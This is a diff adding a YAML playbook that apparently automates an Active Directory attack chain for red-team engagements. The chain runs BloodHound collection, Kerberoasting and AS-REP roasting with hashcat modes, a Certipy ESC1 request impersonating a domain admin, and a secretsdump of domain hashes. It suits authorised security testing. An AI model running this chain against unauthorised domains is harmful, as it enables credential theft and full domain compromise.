@@ -1,0 +1,214 @@
+name: ad_attack
+description: >
+  Active Directory attack chain — BloodHound graph collection, Kerberoasting,
+  AS-REP roasting, ADCS certificate abuse (Certipy ESC1–ESC8), LDAP enumeration,
+  and domain secrets dumping. Designed for engagements where valid domain credentials
+  have been obtained (via Responder, phishing, or other means).
+
+  Phase progression: enumeration → vulnerability assessment → exploitation → post-exploitation.
+  Requires REDTEAM engagement mode for exploitation steps (kerberoast, certipy_req, secretsdump).
+
+tags: [ad, active-directory, bloodhound, kerberoast, certipy, impacket, redteam]
+
+variables:
+  target: ""        # Domain controller IP
+  domain: ""        # FQDN of the domain (e.g. corp.local)
+  username: ""      # Valid domain user (low-priv is fine for most enum steps)
+  password: ""      # Password for the above user
+  base_dn: ""       # LDAP base DN — e.g. DC=corp,DC=local (derived from domain if empty)
+  wordlist: "/usr/share/seclists/Usernames/xato-net-10-million-usernames-nt.txt"
+  ca_name: ""       # CA name for Certipy cert requests (from certipy_find output)
+  template: ""      # Vulnerable template name (from certipy_vuln output)
+
+steps:
+
+  # ── Phase gate ───────────────────────────────────────────────────────────────
+  - name: phase_enumeration
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: enumeration
+    on_fail: continue
+
+  # ── LDAP enumeration ─────────────────────────────────────────────────────────
+  # Queries AD for all user and computer objects. Low-noise; uses read-only LDAP.
+  # Results surface domain admin accounts, service accounts, and stale objects.
+  - name: ldapsearch_users
+    tool: ad_attack
+    action: ldapsearch
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+      base_dn: "${base_dn}"
+      filter: "(objectClass=user)"
+    timeout: 60
+    on_fail: continue
+
+  # ── SMB/LDAP/RPC deep enumeration ────────────────────────────────────────────
+  # enum4linux-ng covers users, groups, shares, password policy, domain info.
+  # More comprehensive than individual ldapsearch queries.
+  - name: enum4linux_ng
+    tool: ad_attack
+    action: enum4linux_ng
+    params:
+      target: "${target}"
+    timeout: 120
+    on_fail: continue
+
+  # ── BloodHound full collection ────────────────────────────────────────────────
+  # Collects all AD objects and relationships (users, groups, ACLs, sessions,
+  # trusts, GPOs) and packages them into a .zip for BloodHound ingestion.
+  # Find shortest path to Domain Admin after importing results.
+  - name: bloodhound_collect
+    tool: ad_attack
+    action: bloodhound_collect
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 300
+    on_fail: continue
+
+  # ── BloodHound ACL/trust edges ────────────────────────────────────────────────
+  # Focused collection of ACL relationships and domain trusts.
+  # Run after full collection if initial BloodHound data shows trust paths.
+  - name: bloodhound_edges
+    tool: ad_attack
+    action: bloodhound_edges
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 180
+    on_fail: continue
+
+  # ── Phase gate ───────────────────────────────────────────────────────────────
+  - name: phase_vuln_assessment
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: vuln_assessment
+    on_fail: continue
+
+  # ── ADCS enumeration ─────────────────────────────────────────────────────────
+  # Enumerate all certificate templates across all CAs.
+  # Identify misconfigured templates — the precursor to Certipy exploitation.
+  - name: certipy_find
+    tool: ad_attack
+    action: certipy_find
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 120
+    on_fail: continue
+
+  # ── ADCS vulnerability check ──────────────────────────────────────────────────
+  # Filter to templates vulnerable to ESC1–ESC8 privilege escalation.
+  # ESC1 (enrollee supplies SAN) is the most common and most impactful.
+  - name: certipy_vuln
+    tool: ad_attack
+    action: certipy_vuln
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 120
+    on_fail: continue
+
+  # ── Phase gate ───────────────────────────────────────────────────────────────
+  - name: phase_exploitation
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: exploitation
+    on_fail: continue
+
+  # ── AS-REP roasting ──────────────────────────────────────────────────────────
+  # Extract hashes for accounts with "Do not require Kerberos preauthentication".
+  # No credentials required — only a username list. Crack offline with hashcat -m 18200.
+  - name: asreproast
+    tool: ad_attack
+    action: asreproast
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      wordlist: "${wordlist}"
+    timeout: 60
+    on_fail: continue
+
+  # ── Kerberoasting ────────────────────────────────────────────────────────────
+  # Request TGS tickets for service accounts (accounts with SPNs set).
+  # Encrypted with the service account's NTLM hash — crack offline with hashcat -m 13100.
+  # High-privilege service accounts (MSSQL, Exchange) are the top targets.
+  - name: kerberoast
+    tool: ad_attack
+    action: kerberoast
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 60
+    on_fail: continue
+
+  # ── ADCS certificate request (ESC1 exploit) ───────────────────────────────────
+  # Request a certificate from a vulnerable template impersonating a domain admin.
+  # Requires ca_name and template from certipy_vuln output.
+  # Skip this step if no vulnerable templates were found.
+  - name: certipy_req
+    tool: ad_attack
+    action: certipy_req
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+      ca_name: "${ca_name}"
+      template: "${template}"
+    timeout: 60
+    on_fail: continue
+
+  # ── Phase gate ───────────────────────────────────────────────────────────────
+  - name: phase_post_exploitation
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: post_exploitation
+    on_fail: continue
+
+  # ── Secrets dump ─────────────────────────────────────────────────────────────
+  # Dump NTDS.dit (domain hashes), SAM, and LSA secrets from the domain controller.
+  # Requires domain admin credentials or a DA certificate obtained above.
+  # All domain account hashes — game over for the domain.
+  - name: secretsdump
+    tool: ad_attack
+    action: secretsdump
+    params:
+      target: "${target}"
+      domain: "${domain}"
+      username: "${username}"
+      password: "${password}"
+    timeout: 120
+    on_fail: continue
+
+  # ── Report ────────────────────────────────────────────────────────────────────
+  - name: phase_report
+    tool: engagement
+    action: transition_phase
+    params:
+      phase: report
+    on_fail: continue
+
+  - name: generate_report
+    tool: engagement
+    action: generate_report
+    params: {}
+    timeout: 30
+    on_fail: continue
